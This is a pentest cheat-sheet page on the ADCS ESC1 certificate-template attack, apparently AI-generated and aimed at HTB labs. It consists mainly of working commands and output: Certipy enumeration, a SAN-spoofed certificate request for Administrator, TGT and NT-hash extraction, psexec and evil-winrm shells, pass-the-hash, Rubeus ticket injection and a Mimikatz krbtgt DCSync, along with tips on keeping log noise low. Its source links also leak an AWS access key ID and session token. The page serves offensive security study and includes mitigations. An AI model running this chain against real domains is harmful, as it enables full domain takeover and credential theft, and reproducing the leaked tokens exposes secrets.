---
title: "ESC1 — SAN Specification in Template"
description: "ESC1 is the most commonly encountered and most directly exploitable ADCS misconfiguration. The vulnerability exists at the certificate template level —…"
category: active-directory
tags: ["active-directory", "adcs", "privilege-escalation", "hashing"]
tools: ["NetExec", "Impacket", "Mimikatz", "Rubeus", "Certipy"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC1 — SAN Specification in Template.md"
---
# ESC1 — SAN Specification in Template

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Certificate Template Misconfiguration |
| **Difficulty** | Low |
| **Pre-requisites** | Low-priv domain creds + vulnerable template |
| **Tools** | Certipy, Certify.exe, Rubeus |
| **OPSEC Noise** | Low — only CA event logs (4886/4887) |
| **One-liner** | Inject Administrator UPN into the SAN field of a CSR via a template with `ENROLLEE_SUPPLIES_SUBJECT` enabled — CA signs it, you authenticate as that user. |

***

## What Is ESC1?

ESC1 is the most commonly encountered and most directly exploitable ADCS misconfiguration. The vulnerability exists at the **certificate template level** — specifically when a template allows the person requesting the certificate to freely specify a **Subject Alternative Name (SAN)** inside their Certificate Signing Request (CSR). A SAN is an extension in an X.509 certificate that binds an identity (e.g., a UPN like `administrator@domain.htb`) to the certificate. When the CA issues a certificate containing a SAN, Windows trusts that identity for authentication — it doesn't matter who actually requested the cert.

The core danger: **you enroll as a low-privileged user but embed Administrator (or any domain account) into the SAN field. The CA signs it. You then authenticate as that user.** No password needed, no hash needed — the certificate *is* the identity.

***

## ESC1 — The Six Required Conditions

All six must be true simultaneously for this to be exploitable:

| # | Condition | What to Check in Certipy Output |
|---|-----------|--------------------------------|
| 1 | Low-privileged users have **enrollment rights** | `Enrollment Rights: DOMAIN\Domain Users` |
| 2 | **Manager approval is off** | `Requires Manager Approval: False` |
| 3 | **No authorized signatures required** | `Authorized Signatures Required: 0` |
| 4 | Template security descriptor is **overly permissive** | Low-priv group in `Enrollment Rights` |
| 5 | Template has an **authentication EKU** | `Client Authentication: True` or `Smart Card Logon`, `PKINIT`, `Any Purpose`, or no EKU |
| 6 | **Enrollee Supplies Subject** is enabled | `Enrollee Supplies Subject: True` / `Certificate Name Flag: EnrolleeSuppliesSubject` |

***

## Understanding the Key Flag: `ENROLLEE_SUPPLIES_SUBJECT`

This is the flag that makes ESC1 possible. It corresponds to the AD attribute `msPKI-Certificate-Name-Flag` with value `0x00000001`. When this is set, the CA does **not** build the subject name from Active Directory — it trusts whatever the requester submits. Microsoft's intent was for this to support non-AD scenarios (e.g., web server certificates). The misconfiguration is when this is combined with a template that also supports domain authentication EKUs .

***

## Step 0 — Initial Enumeration

Before attacking, always enumerate first. This tells you CA names, template names, and which templates are vulnerable.

```bash
# Full enumeration, filter only vulnerable, print to stdout
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# If you only have a hash (Pass-the-Hash)
certipy-ad find -u 'lowpriv@domain.htb' \
  -hashes :NTHASH \
  -dc-ip $TARGET -vulnerable -stdout
```

### What a Vulnerable ESC1 Template Looks Like
```
Certificate Templates
  Template Name                       : VulnTemplate
  Enabled                             : True
  Client Authentication               : True        ← Auth EKU ✓
  Enrollment Agent                    : False
  Any Purpose                         : False
  Enrollee Supplies Subject           : True         ← THE key flag ✓
  Certificate Name Flag               : EnrolleeSuppliesSubject
  Requires Manager Approval           : False        ← No approval ✓
  Authorized Signatures Required      : 0            ← No sig req ✓
  Permissions
    Enrollment Rights : DOMAIN\Domain Users          ← Low-priv enroll ✓
  [!] Vulnerabilities
    ESC1 : 'DOMAIN\Domain Users' can enroll, enrollee supplies subject
           and template allows client authentication
```

***

## Step 1 — Request the Certificate with Injected SAN

The `-upn` flag is what injects the alternative identity into the SAN field of the CSR. You are requesting with your low-priv credentials, but embedding `Administrator` as the identity.

```bash
# Using password
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'VulnerableTemplateName' \
  -upn 'administrator@domain.htb'

# Using hash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -hashes :NTHASH \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'VulnerableTemplateName' \
  -upn 'administrator@domain.htb'
```

**Expected output:**
```
[*] Requesting certificate via RPC
[*] Request ID is 58
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@domain.htb'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'administrator.pfx'
```

> ⚠️ **`Certificate has no object SID`** — This is normal for ESC1. It means the cert was issued without an objectSID extension, so Windows falls back to UPN-based mapping. This is fine for older/default configurations. On patched systems (KB5014754 enforced), this *may* fail — but in most HTB/real-world scenarios you will still succeed.

> ⚠️ **`The NETBIOS connection with the remote host timed out`** — This is a common transient RPC error. Simply re-run the command without `-dc-host`. Remove that flag if you added it, as shown in your Fluffy terminal output.

***

## Step 2 — Authenticate and Get TGT + NT Hash

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET
```

**Expected output:**
```
[*] Certificate identities:
[*]     SAN UPN: 'administrator@domain.htb'
[*] Using principal: 'administrator@domain.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@domain.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Certipy uses **PKINIT** (Public Key Cryptography for Initial Authentication) to trade the certificate for a Kerberos TGT, and then uses **U2U (User-to-User)** Kerberos to extract the NT hash from the TGT. You now have both a TGT and the NTLM hash.

***

## Step 3 — Use the TGT or Hash to Get a Shell

**Option A — Kerberos TGT (recommended, opsec-safe):**
```bash
export KRB5CCNAME=administrator.ccache

# WMIexec
wmiexec.py -k -no-pass DC01.domain.htb

# Evil-WinRM with Kerberos
evil-winrm -i DC01.domain.htb -r domain.htb

# SMBexec
smbexec.py -k -no-pass DC01.domain.htb

# PSExec
psexec.py -k -no-pass DC01.domain.htb
```

> 💡 **DNS resolution is required for Kerberos.** Add the DC to `/etc/hosts`: `echo "$TARGET DC01.domain.htb domain.htb" >> /etc/hosts`

**Option B — Pass-the-Hash (NT hash):**
```bash
# Evil-WinRM with hash
evil-winrm -i $TARGET -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e

# Impacket
wmiexec.py administrator@$TARGET -hashes :8da83a3fa618b6e3a00e93f676c92a6e
psexec.py administrator@$TARGET -hashes :8da83a3fa618b6e3a00e93f676c92a6e
```

***

## Windows Attack Path (Certify.exe + Rubeus)

If you're already on a Windows foothold:

```powershell
# Step 1: Request cert with alt SAN
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /template:VulnTemplate /altname:administrator

# Step 2: Copy cert.pem output, save it, convert with OpenSSL
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# Leave password blank when prompted

# Step 3: Request TGT + dump NT hash with Rubeus
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap

# Step 4: Create sacrificial session and inject ticket
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe ptt /ticket:<base64ticket>

# Step 5: DCSync from injected session
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

***

## Real-World Example — Your Fluffy HTB Machine

This is **exactly ESC16** on Fluffy, not ESC1 — but the exploitation chain you used is ESC16's UPN swap technique which *mimics* ESC1's outcome. Notice in your terminal:

```bash
# You swapped ca_svc's UPN to 'administrator'
certipy-ad account -u winrm_svc@fluffy.htb -hashes ... \
  -user ca_svc -upn administrator update

# Requested cert via the User template (no ESC1 template needed — ESC16 bypasses it)
certipy-ad req -u ca_svc -hashes ... -ca fluffy-DC01-CA -template User

# Got cert with UPN 'administrator' — same end result as ESC1
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

In a **pure ESC1**, you would not need to manipulate any account's UPN first — you'd inject the UPN directly via `-upn` in the `certipy-ad req` command. ESC16 is covered later in the series.

***

## ESC1 Indicators Summary

| Indicator | Vulnerable Value |
|-----------|-----------------|
| `msPKI-Certificate-Name-Flag` | `ENROLLEE_SUPPLIES_SUBJECT` (0x1) |
| `msPKI-EnrollmentFlag` | Does NOT contain `PEND_ALL_REQUESTS` (0x2) |
| `msPKI-RA-Signature` | `0` |
| `pKIExtendedKeyUsage` | Contains `1.3.6.1.5.5.7.3.2` (Client Auth) or similar |
| Enrollment ACL | Includes low-priv groups (`Domain Users`, `Authenticated Users`) |

***

## KB5014754 — Strong Certificate Binding Enforcement

Microsoft's May 2022 patch (KB5014754) introduced the `szOID_NTDS_CA_SECURITY_EXT` SID extension into certificates. This can affect ESC1 exploitation on patched systems:

| `StrongCertificateBindingEnforcement` Value | ESC1 Impact |
|---|---|
| `0` — Disabled | ✅ ESC1 works normally |
| `1` — Compatibility mode (default post-patch) | ⚠️ ESC1 still works but generates audit events |
| `2` — Full enforcement | ❌ ESC1 blocked — KDC validates objectSID in cert |

```bash
# Check enforcement level on DC
netexec smb $TARGET -u 'lowpriv' -p 'Password123!' \
  -x 'reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement'
```

> 💡 Most environments are still on compatibility mode (`1`) — ESC1 still works. Full enforcement (`2`) is rare because it breaks environments with legacy certs that lack the SID extension.

***

## OPSEC Considerations

| Action | Log Generated | Noise Level |
|--------|--------------|-------------|
| Certipy enumeration (`find`) | LDAP queries | 🟢 Low |
| Certificate request (`req`) | Event ID 4886 (request), 4887 (issued) on CA | 🟢 Low |
| PKINIT authentication (`auth`) | Event ID 4768 (TGT request) on DC | 🟢 Low |
| Pass-the-Hash after auth | Event ID 4624 Type 3/9 | 🟡 Medium |

> 💡 ESC1 is the **quietest** ADCS attack — no AD object modifications, no template changes, no relay traffic. The only logs are on the CA (cert request) and DC (Kerberos auth). If you use the TGT path instead of PtH, it's even quieter.

***

## Additional Tool Support

```bash
# Metasploit module
use auxiliary/admin/dcerpc/icpr_cert
set RHOSTS <CA-IP>
set USERNAME lowpriv
set PASSWORD Password123!
set DOMAIN domain.htb
set CA DOMAIN-CA-NAME
set CERT_TEMPLATE VulnTemplate
set ALT_UPN administrator@domain.htb
run
```

***

## Mitigation

- **Disable** `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` on any template that has authentication EKUs
- **Restrict enrollment rights** — remove `Domain Users` / `Authenticated Users`; grant only specific service accounts
- **Enable Manager Approval** on any template where SAN specification is business-required
- **Set `StrongCertificateBindingEnforcement = 2`** on all DCs after re-issuing certificates with SID extensions
- **Monitor** certificate requests where the SAN differs from the requester's identity (Event ID 4886/4887 on the CA)

Sources
 redblock_team-11.-ADCS-Attacks.pdf https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/14624338/ba26726a-dc39-49bb-a7f4-de582faee79b/redblock_team-11.-ADCS-Attacks.pdf?AWSAccessKeyId=ASIA2F3EMEYE2RB7VN3N&Signature=6uwSMMzenwFOZlbo1P4KVYOKVio%3D&x-amz-security-token=IQoJb3JpZ2luX2VjEMb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJHMEUCIQCDVU42sVlwQOfJERjsghflP45l3bVzzfRHElUL2965EgIgJ3%2Bdir2PwWMNTEVZ%2F7kmsFOsIPkzJJc0fig%2BsKzqVtsq%2FAQIjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARABGgw2OTk3NTMzMDk3MDUiDLdQ6H8jp5zqDUG2zCrQBEUINgutUEVlTAtTqHdLzM1xiQIkB49UmP9AKI2%2FqkDL9ZYqkeHJIc0EP5SolM5Oo0L0R78Ky2dalTRl8zeJkt3x5DLocVtRl4wvSWxIxobyQCnQFwepMKq5pB8x0I9kJAZJgix05zBhSPUvNoSgcKxwq6p9tDc1HwNp0fGSf71%2B1xY7PYYACGQx%2FjpLbQNOMtrxIVkhbGDivWkG%2FE4RjOqYyvfMhSwN9RalfqlLuEfkRPmtwTwOlO2Z%2ByLWBMSeC5KE5M7CxTbW4w6kpbYz675BpTTvc%2Be%2Bj6SMC7jqIVTOvRhUzX1BE89eGl9fPkXZ%2F7RP%2BRvCySdjvGkN9Y%2BTZaYhs1dy0iljxfv35aYkTvmnVYE1YeEJy4U4yrWrtGEYuFr6PHvsGhq1BtSCxcZTqfdh%2BLTXNV%2BSaY3BV9F3dMp7TObOlMq5GCw31QzerzTt5SnRfC5Oy6xosBYGYSsD99hbsaAoM4wldLmvZPaU%2FQ9OYeUA2WnJ8YfomIk8oVa8zlNpTbcZiHwzruy4SU5qRnhLELCCFWNMMEpuKKRI0AsvWW50Ak9EbxwNjSsdFqFcKTFCdg2IYHWyTlqT%2B5gQBt%2BV63Q6%2B4fpZH2C6MQdI2OvNETFfJNaYPNFBKy4rpI%2F2ylRGww1%2B5iDVZeWZsC1%2F3zbidiWSGIOBGTUu2U%2BCn5ns7R0MC5mPpwqRSzCf14dWr5%2Fsfa8tws2%2FDUJKnQHHzMofecx%2BppjH8sXnLEl99qn9vmSsqcl50mnLI9ozZvZdd3nPhYPzEc1HpEk88a05ccwhdzAzgY6mAFv8g24saOF0u0nO6CvmEYWmNTBQUXADi20mRyrLMvH0fvzdutXTI5EWJKb3fe2QqOsl0ded9IQomVlCwPOjiSaGxdtA3iKxcJuGEMkxIDQtawntSKVlncFbwbEgiBMqiM9PuUckG58dIbgVcli9iHL3YFjyowff1MQ6zphRVvAdWKEspZ%2Bcne%2BUIf315efSksTiUze3N0DDQ%3D%3D&Expires=1775253889
 Screenshot-Perplexity-2026-04-03-at-18.54.05_Friday-2x.jpeg https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/images/14624338/bd5f25d5-7087-4cad-9068-50e9f63534f3/Screenshot-Perplexity-2026-04-03-at-18.54.05_Friday-2x.jpeg
